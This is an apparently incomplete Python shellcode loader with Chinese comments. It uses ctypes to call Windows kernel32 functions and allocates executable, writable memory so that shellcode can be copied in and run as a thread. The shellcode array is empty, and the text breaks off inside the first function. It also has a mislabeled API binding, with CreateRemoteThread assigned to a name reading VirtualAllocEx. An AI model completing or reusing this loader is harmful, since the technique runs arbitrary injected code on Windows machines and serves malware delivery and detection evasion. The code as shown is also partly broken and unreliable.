# 导入模块，分配内存进行读写操作
from ctypes import *
import ctypes
from ctypes.wintypes import *

PAGE_EXECUTE_READWRITE = 0X00000040 #区域可执行代码，可读可写
MEM_COMMIT = 0x3000 #分配内存
PROCESS_ALL_ACCESS = (0X000f0000 | 0X00100000 | 0XFFF)#给予进程所有权限

# 调用windows api，以便于后续调用
# api
VirtalAlloc = windll.kernel32.VirtualAlloc
RtlMoveMemory = windll.kernel32.RtlMoveMemory
CreateThread = windll.kernel32.CreateThread
WaitForSingleObject = windll.kernel32.WaitForSingleObject
OpenProcess = windll.kernel32.OpenProcess
VirtualAllocEx = windll.kernel32.CreateRemoteThread

shellcode = bytearray(

)

def run1():
    VirtalAlloc.restype = ctypes.c_void_p # 重载函数返回类型为void
    p = VirtalAlloc(c_int(0),c_int(len(shellcode)),MEM_COMMIT,PAGE_EXECUTE_READWRITE)#申请内存
    buf = (c_char * len(shellcode))